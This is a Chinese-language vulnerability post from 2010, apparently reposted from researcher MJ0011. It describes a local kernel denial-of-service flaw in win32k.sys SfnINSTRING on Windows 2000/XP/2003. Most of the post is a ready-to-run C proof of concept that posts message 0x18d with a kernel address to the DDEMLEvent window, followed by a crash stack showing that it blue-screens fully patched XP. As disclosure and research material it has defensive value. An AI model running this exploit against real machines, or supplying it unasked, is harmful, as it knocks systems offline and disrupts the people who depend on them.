---
title: Windows 2000/XP/2003 win32k.sys SfnINSTRING 本地内核拒绝服务漏洞
description: post/Windows-2000-XP-2003-win32k.sys-SfnINSTRING-local-DOS.html">Windows2000/XP/2003win32k.sysSfnINSTRING本地内核拒绝服务漏洞影响范围:post/Deepin-GHOST-XP-SP3-V9.0-ISO.html">MicrosoftWindowsXP/2000/2003全补丁漏洞细节：Win32k.sys在DispatchMessage时，会最后调用到xxxDefWindowProc,这个函数在处理某些消息时，会调用gapfnScSendMessage这个函数表中的函数来处理，其中2000/post/Deepin-LiteXP-Windows-XP-SP3-V6.2.html">xp/2003下在处理0x18d号消息时，会有一个名为post/Windows-2000-XP-2003-win32k.sys-SfnINSTRING-local-DOS.html">SfnINSTRING的函数，这个函数当lParam不为空时，直接认为lParam是内存指针，并直接从地址中取出数据，尽管函数内使用了SEH，但是只要传递错误的内核地址，仍然会引发系统崩溃
date: 2010-04-27 11:29:16
category: 漏洞信息
tags: ['漏洞信息', '内核', 'Windows']
post_id: 1125
alias: Windows-2000-XP-2003-win32k.sys-SfnINSTRING-local-DOS
ViewNums: 2998
---

[Windows 2000/XP/2003 win32k.sys SfnINSTRING 本地内核拒绝服务漏洞](/blog/windows-2000-xp-2003-win32ksys-sfninstring-local-dos)
影响范围:[Microsoft Windows XP](/blog/deepin-ghost-xp-sp3-v90-iso)/2000/2003 全补丁

漏洞细节：

Win32k.sys 在DispatchMessage时，会最后调用到xxxDefWindowProc,这个函数在处理某些消息时，会调用gapfnScSendMessage这个函数表中的函数来处理，其中2000/[xp](/blog/deepin-litexp-windows-xp-sp3-v62)/2003下在处理0x18d号消息时，会有一个名为[SfnINSTRING](/blog/windows-2000-xp-2003-win32ksys-sfninstring-local-dos)的函数，这个函数当lParam不为空时，直接认为lParam是内存指针，并直接从地址中取出数据，尽管函数内使用了SEH，但是只要传递错误的内核地址，仍然会引发系统崩溃

测试代码：

#include "stdafx.h"
#include "windows.h"
int main(int argc, char* argv[])
{

printf("Microsoft [Windows](/blog/windows-server-2008-x86-dvd-chs) Win32k.sys SfnINSTRING Local D.O.S Vuln
By MJ0011
th_decoder@126.com
PressEnter");

getchar();
HWND hwnd = FindWindow("DDEMLEvent" , NULL);

if (hwnd == 0 )
{
   printf("cannot find DDEMLEvent Window!
");
   return 0 ;
}

PostMessage(hwnd , 0x18d , 0x0 , 0x80000000);

return 0 ;
}

全补丁的[XP](/blog/deepin-litexp-windows-xp-sp3-v62)运行此代码立即蓝屏

常见崩溃栈：

kd> kc

win32k!SfnINSTRING
win32k!xxxDefWindowProc
win32k!xxxEventWndProc
win32k!xxxDispatchMessage
win32k!NtUserDispatchMessage
....

[Windows 7](/blog/windows-7-rtm-build-760016385)/Vista 无此问题

via [mj0011](http://hi.baidu.com/mj0011)

